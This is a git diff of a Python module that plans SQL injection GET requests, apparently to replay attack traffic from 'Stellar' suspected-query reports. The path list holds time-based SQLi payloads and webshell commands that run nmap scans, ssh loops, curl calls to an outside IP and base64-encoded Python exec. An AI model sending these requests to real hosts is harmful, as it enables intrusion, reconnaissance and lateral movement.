@@ -1,11 +1,11 @@
-"""SQL injection payload and URL planning — GET, POST form, and JSON POST bodies."""
+"""SQL injection payload and URL planning — Stellar suspected-query GET requests."""
 
 from __future__ import annotations
 
-import json
-import random
+import base64
 from dataclasses import dataclass
-from urllib.parse import quote, urlencode
+from typing import Any
+from urllib.parse import quote
 
 from dsp.protocols.base import HttpProtocolError
 from dsp.protocols.http.urls import (
@@ -15,26 +15,66 @@ from dsp.protocols.http.urls import (
     build_url,
 )
 
+# Stellar External/Internal Suspected SQL Injection Documents (2026-06-23).
 SQLI_PATHS: tuple[str, ...] = (
-    "/search",
-    "/search.php",
-    "/product",
-    "/product.php",
-    "/item",
-    "/item.php",
+    "/2015/sessions?utf8=%E2%9C%93&session[username]=test12341%27%20%2B%20(SELECT%200%20FROM%20(SELECT%20SLEEP(3))qsqli_2222)%20%2B%20%27&session[password]=test1234567&session[redirect_url]=%2F2015%2Fprodu...",
+    "/?author=1",
+    "/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g",
+    "/DeviceInformation",
+    "/WEB-INF/web.xml",
+    "/WEB-INF/web.xml?id=%00%00%00",
+    "/WEB_VMS/LEVEL15/",
+    "/api/v1/components?name=1&1%5B0%5D&1%5B1%5D=a&1%5B2%5D&1%5B3%5D=or+'a'='a')%20and%20(select%20sleep(6))--",
+    "/api/v3/notifications?pageSize=0&filters=%5B%7B%22readIAN%22%3A%7B%22operator%22%3A%22%3D%22%2C%22values%22%3A%5B%22f%22%5D%7D%7D%5D",
+    "/bsh.servlet.BshServlet",
+    "/cdn-cgi/challenge-platform/h/b/rc/a010b054ace6ebfc",
+    "/cdn-cgi/challenge-platform/h/b/rc/a021918c1bf9e791",
+    "/cdn-cgi/challenge-platform/h/g/rc/a0847ff8bdf2b5cf",
+    "/cdn-cgi/challenge-platform/h/g/rc/a0a8c257f8a155d8",
+    "/cdn-cgi/challenge-platform/h/g/rc/a0b99a816b3bb7c5",
+    "/cdn-cgi/challenge-platform/h/g/rc/a0d59fdfd913cc12",
+    "/cmd.jsp?file=..%2F..%2Fweb.xml",
+    "/dvwa/",
+    "/favicon.ico",
+    "/formmail/formmailto.html",
     "/login",
-    "/login.php",
-    "/admin/login",
-    "/graphql",
-    "/api/search",
-    "/api/product",
-    "/api/user",
-    "/catalog",
-    "/query",
-    "/admin",
-    "/api",
-    "/index.html",
+    "/qLWWcLUO.koi8-r",
+    "/servlet/~ic/bsh.servlet.BshServlet",
+    "/shell.jsp",
+    "/shell.jsp?cmd=b64_nw%28%29%7B+if+command+-v+base64+%3E%2Fdev%2Fnull+2%3E%261%3B+then+base64+-w+0+2%3E%2Fdev%2Fnull+%7C%7C+base64+%7C+tr+-d+%22%5Cn%22%3B+elif+command+-v+openssl+%3E%2Fdev%2Fnull+2%3E%...",
+    "/shell.jsp?cmd=bash+%3C%3C%27INTERNAL_FANOUT_SCRIPT%27%0Anormal_uas%3D%27Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F120.0.0.0+Safari%2F...",
+    "/shell.jsp?cmd=bash+%3C%3C%27SIG_UA_SCRIPT%27%0Ab64_nw%28%29%7B+if+command+-v+base64+%3E%2Fdev%2Fnull+2%3E%261%3B+then+base64+-w+0+2%3E%2Fdev%2Fnull+%7C%7C+base64+%7C+tr+-d+%22%5Cn%22%3B+elif+command+...",
+    "/shell.jsp?cmd=command+-v+ping+2%3E%2Fdev%2Fnull+%7C%7C+true%3B+_poc_ec%3D%24%3F%3B+echo+__EXIT_CODE%3A%24%7B_poc_ec%7D",
+    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+Go-http-client%2F1.1+-H+X-Request-ID%3A%5C+31603-31084-1+-H+X-Session-ID...",
+    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+10565-24638-22+-H+X-Sessi...",
+    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+22475-25821-11+-H+X-Sessi...",
+    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+24479-15225-11+-H+X-Sessi...",
+    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+26396-27273-1+-H+X-Sessio...",
+    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+29830-30973-3+-H+X-Sessio...",
+    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+7592-23678-17+-H+X-Sessio...",
+    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+HEAD+--user-agent+TelemetryAgent%2F1.1+-H+X-Request-ID%3A%5C+29011-29952-15+-H+X-Session-...",
+    "/shell.jsp?cmd=for+i+in+%24%28seq+1+100%29%3B+do+ssh+-o+BatchMode%3Dyes+-o+ConnectTimeout%3D2+-o+StrictHostKeyChecking%3Dno+-o+UserKnownHostsFile%3D%2Fdev%2Fnull+-o+GlobalKnownHostsFile%3D%2Fdev%2Fnul...",
+    "/shell.jsp?cmd=for+i+in+%24%28seq+1+300%29%3B+do+ssh+-o+BatchMode%3Dyes+-o+ConnectTimeout%3D2+-o+StrictHostKeyChecking%3Dno+-o+UserKnownHostsFile%3D%2Fdev%2Fnull+-o+GlobalKnownHostsFile%3D%2Fdev%2Fnul...",
+    "/shell.jsp?cmd=head_code%3D%24%28curl+-k+-s+-o+%2Fdev%2Fnull+-w+%27%25%7Bhttp_code%7D%27+--max-time+5+-I+%27https%3A%2F%2F221.139.249.122%3A443%2F%27+2%3E%2Fdev%2Fnull+%7C%7C+echo+000%29%3B+get_code%3...",
+    "/shell.jsp?cmd=mkdir+-p+%27%2Ftmp%2F.poc_runtime_root%27+%27%2Ftmp%2F.poc_runtime_root%2Fstage%27+%27%2Ftmp%2F.poc_runtime_root%2Ffake%27+%27%2Ftmp%2F.poc_runtime_root%2Fstate%27+%27%2Ftmp%2F.poc_runt...",
+    "/shell.jsp?cmd=nmap+-Pn+-n+-T4+--max-retries+1+--host-timeout+15s+-p+22%2C53%2C80%2C443%2C445%2C389%2C8080%2C8443%2C6379%2C9200%2C27017+--open+221.139.249.65-96",
+    "/shell.jsp?cmd=nmap+-Pn+-n+-T4+--max-retries+1+--host-timeout+15s+-p+22%2C53%2C80%2C5000%2C5001%2C7001%2C7002%2C8000%2C8008%2C8080%2C8081%2C8082%2C8088%2C8888%2C9000%2C9090%2C10000%2C443%2C8443%2C9443...",
+    "/shell.jsp?cmd=normal_uas%3D%27Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F120.0.0.0+Safari%2F537.36%27%0Arare_uas%3D%27TelemetryCollect...",
+    "/shell.jsp?cmd=python3+-c+import%5C+base64%5C%3Bexec%5C%28base64.b64decode%5C%28%5C%27aW1wb3J0IHJhbmRvbSwgc29ja2V0LCB0aW1lCmRlYWRfaXBzID0gW2YiMjIxLjEzOS4yNDkue3h9IiBmb3IgeCBpbiBbMTk5LDIwMSwyMDMsMjA1LD...",
+    "/shell.jsp?cmd=sh+-c+mkdir%5C+-p%5C+%5C%27%2Ftmp%2F.poc_runtime_root%5C%27%5C+%5C%27%2Ftmp%2F.poc_runtime_root%2Fstage%5C%27%5C+%5C%27%2Ftmp%2F.poc_runtime_root%2Ffake%5C%27%5C+%5C%27%2Ftmp%2F.poc_run...",
+    "/storekontak",
+    "/sys/ui/extend/varkind/custom.jsp",
+    "/wp-admin/options-general.php?page=smartcode",
+    "/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php",
+    "/wp-content/plugins/feed-them-social/readme.txt",
+    "/wp-content/plugins/mainwp-vuln/readme.txt",
+    "/wp-content/plugins/raygun4wp/readme.txt",
+    "/zentao/user-login.html",
 )
+
+SQLI_SUSPECTED_QUERY_CATEGORY = "suspected_query"
+SQLI_REPEATS_PER_PATH = 3
+SQLI_REQUESTS_PER_HOST = len(SQLI_PATHS) * SQLI_REPEATS_PER_PATH
 
 SQLI_PARAM_NAMES: tuple[str, ...] = (
     "id",
@@ -145,80 +185,81 @@ class PlannedSqliRequest:
     query: str = ""
     body: bytes | None = None
     content_type: str | None = None
+    encode_query: bool = True
 
     @property
     def url(self) -> str:
-        return build_sqli_url(self.host, self.port, self.path, self.query)
+        return build_sqli_url(
+            self.host,
+            self.port,
+            self.path,
+            self.query,
+            encode_query=self.encode_query,
+        )
 
 
-def build_sqli_url(host: str, port: int, path: str, query: str) -> str:
+def build_sqli_url(
+    host: str,
+    port: int,
+    path: str,
+    query: str,
+    *,
+    encode_query: bool = True,
+) -> str:
     """Build HTTP/HTTPS URL with optional query string appended to path."""
     base = build_url(host, port, path)
     if not query:
         return base
-    encoded = quote(query, safe="='&?")
+    if encode_query:
+        encoded = quote(query, safe="='&?")
+    else:
+        encoded = query
     return f"{base}?{encoded}"
 
 
-def _payload_specs() -> list[tuple[str, str]]:
-    specs: list[tuple[str, str]] = []
-    for category, payloads in SQLI_PAYLOAD_CATEGORIES.items():
-        for payload in payloads:
-            specs.append((category, payload))
-    return specs
+def _split_suspected_query(suspected: str) -> tuple[str, str]:
+    """Split a Stellar suspected query into HTTP path and query string."""
+    if "?" in suspected:
+        path, query = suspected.split("?", 1)
+        return path, query
+    return suspected, ""
 
 
-def _build_request_for_transport(
+def _build_suspected_query_request(
     host: str,
     port: int,
-    path: str,
-    parameter: str,
-    payload: str,
-    payload_category: str,
-    transport: str,
+    suspected: str,
 ) -> PlannedSqliRequest:
-    if transport == "query":
-        query = f"{parameter}={payload}"
-        return PlannedSqliRequest(
-            host=host,
-            port=port,
-            path=path,
-            parameter=parameter,
-            payload=payload,
-            payload_category=payload_category,
-            transport=transport,
-            method="GET",
-            query=query,
-        )
-    if transport == "form":
-        body = urlencode({parameter: payload}).encode("utf-8")
-        return PlannedSqliRequest(
-            host=host,
-            port=port,
-            path=path,
-            parameter=parameter,
-            payload=payload,
-            payload_category=payload_category,
-            transport=transport,
-            method="POST",
-            body=body,
-            content_type="application/x-www-form-urlencoded",
-        )
-    if transport == "json":
-        body = json.dumps({parameter: payload}).encode("utf-8")
-        return PlannedSqliRequest(
-            host=host,
-            port=port,
-            path=path,
-            parameter=parameter,
-            payload=payload,
-            payload_category=payload_category,
-            transport=transport,
-            method="POST",
-            body=body,
-            content_type="application/json",
-        )
-    raise HttpProtocolError(f"unknown SQLi transport: {transport!r}")
+    path, embedded_query = _split_suspected_query(suspected)
+    return PlannedSqliRequest(
+        host=host,
+        port=port,
+        path=path,
+        parameter="",
+        payload=embedded_query or suspected,
+        payload_category=SQLI_SUSPECTED_QUERY_CATEGORY,
+        transport="query",
+        method="GET",
+        query=embedded_query,
+        encode_query=False,
+    )
+
+
+def sql_injection_request_items(plans: list[PlannedSqliRequest]) -> list[dict[str, Any]]:
+    """Serialize planned SQLi requests for webshell command and bundle execution."""
+    requests: list[dict[str, Any]] = []
+    for plan in plans:
+        item: dict[str, Any] = {
+            "url": plan.url,
+            "method": plan.method,
+            "payload_category": plan.payload_category,
+            "parameter": plan.parameter,
+        }
+        if plan.body is not None:
+            item["body_b64"] = base64.b64encode(plan.body).decode("ascii")
+            item["content_type"] = plan.content_type
+        requests.append(item)
+    return requests
 
 
 def plan_sqli_requests(
@@ -228,14 +269,16 @@ def plan_sqli_requests(
     max_per_host: int = MAX_REQUESTS_PER_HOST_DEFAULT,
     max_total: int = MAX_REQUESTS_TOTAL_DEFAULT,
     paths: tuple[str, ...] = SQLI_PATHS,
+    repeats_per_path: int = SQLI_REPEATS_PER_PATH,
 ) -> list[PlannedSqliRequest]:
     """
-    Plan SQL injection HTTP requests across explicit endpoints.
+    Plan SQL injection HTTP GET requests across explicit endpoints.
 
-    Uses GET query strings, POST form bodies, and JSON POST bodies.
-    Endpoints are chosen randomly from the path pool for realistic web-app coverage.
+    Each selected endpoint receives every suspected query in ``paths`` exactly
+    ``repeats_per_path`` times (default: 53 paths x 3 repeats = 159 requests).
     """
-    if max_hosts < 1 or max_per_host < 1 or max_total < 1:
+    del max_per_host, max_total  # volume is fixed by path pool and repeat count
+    if max_hosts < 1 or repeats_per_path < 1:
         raise HttpProtocolError("request caps must be positive")
     if not paths:
         raise HttpProtocolError("at least one path is required")
@@ -246,34 +289,10 @@ def plan_sqli_requests(
     if not selected:
         raise HttpProtocolError("at least one endpoint is required")
 
-    specs = _payload_specs()
-    path_pool = list(paths)
     plans: list[PlannedSqliRequest] = []
-    spec_index = 0
-    param_index = 0
-    transport_index = 0
-
     for host, port in selected:
-        host_count = 0
-        while host_count < max_per_host and len(plans) < max_total:
-            category, payload = specs[spec_index % len(specs)]
-            parameter = SQLI_PARAM_NAMES[param_index % len(SQLI_PARAM_NAMES)]
-            path = random.choice(path_pool)
-            transport = SQLI_TRANSPORTS[transport_index % len(SQLI_TRANSPORTS)]
-            plans.append(
-                _build_request_for_transport(
-                    host,
-                    port,
-                    path,
-                    parameter,
-                    payload,
-                    category,
-                    transport,
-                )
-            )
-            host_count += 1
-            spec_index += 1
-            param_index += 1
-            transport_index += 1
+        for suspected in paths:
+            for _ in range(repeats_per_path):
+                plans.append(_build_suspected_query_request(host, port, suspected))
 
     return plans
